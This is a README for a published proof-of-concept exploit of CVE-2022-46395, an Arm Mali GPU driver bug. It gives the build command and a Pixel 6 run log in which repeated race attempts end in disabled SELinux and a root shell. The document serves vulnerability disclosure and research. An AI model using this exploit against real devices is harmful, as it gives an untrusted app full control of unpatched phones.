## Exploit for CVE-2022-46395

The write up can be found [here](https://github.blog/2023-05-25-rooting-with-root-cause-finding-a-variant-of-a-project-zero-bug). This is a bug in the Arm Mali kernel driver that I reported in November 2022. The bug can be used to gain arbitrary kernel code execution from the untrusted app domain, which is then used to disable SELinux and gain root.

The exploit is tested on the Google Pixel 6 with the Novmember 2022 and January 2023 patch. For reference, I used the following command to compile with clang in ndk-21:

```
android-ndk-r21d-linux-x86_64/android-ndk-r21d/toolchains/llvm/prebuilt/linux-x86_64/bin/aarch64-linux-android30-clang -DSHELL mali_user_buf.c mempool_utils.c mem_write.c -o mali_user_buf
```

The exploit should be run a couple of minutes after boot and is likely to have to run for a few minutes to succeed. It is not uncommon to fail the race conditions hundreds of times, although failing the race condition does not have any ill effect and the exploit as a whole rare crashes. If successful, it should disable SELinux and gain root.

```
oriole:/ $ /data/local/tmp/mali_user_buf                                       
fingerprint: google/oriole/oriole:13/TQ1A.230105.002/9325679:user/release-keys
benchmark_time 357
failed after 100
failed after 200
failed after 300
benchmark_time 343
failed after 400
failed after 500
failed after 600
benchmark_time 337
failed after 700
failed after 800
failed after 900
benchmark_time 334
failed after 1000
failed after 1100
failed after 1200
benchmark_time 363
failed after 1300
finished reset: 190027720 fault: 135735849 772 err 0 read 3
found pgd at page 4
overwrite addr : 76f6100710 710
overwrite addr : 76f5f00710 710
overwrite addr : 76f6100710 710
overwrite addr : 76f5f00710 710
overwrite addr : 76f5d00710 710
overwrite addr : 76f5b00710 710
overwrite addr : 76f5d00710 710
overwrite addr : 76f5b00710 710
overwrite addr : 76f6100fd4 fd4
overwrite addr : 76f5f00fd4 fd4
overwrite addr : 76f6100fd4 fd4
overwrite addr : 76f5f00fd4 fd4
overwrite addr : 76f5d00fd4 fd4
overwrite addr : 76f5b00fd4 fd4
overwrite addr : 76f5d00fd4 fd4
overwrite addr : 76f5b00fd4 fd4
result 50
oriole:/ # 
```
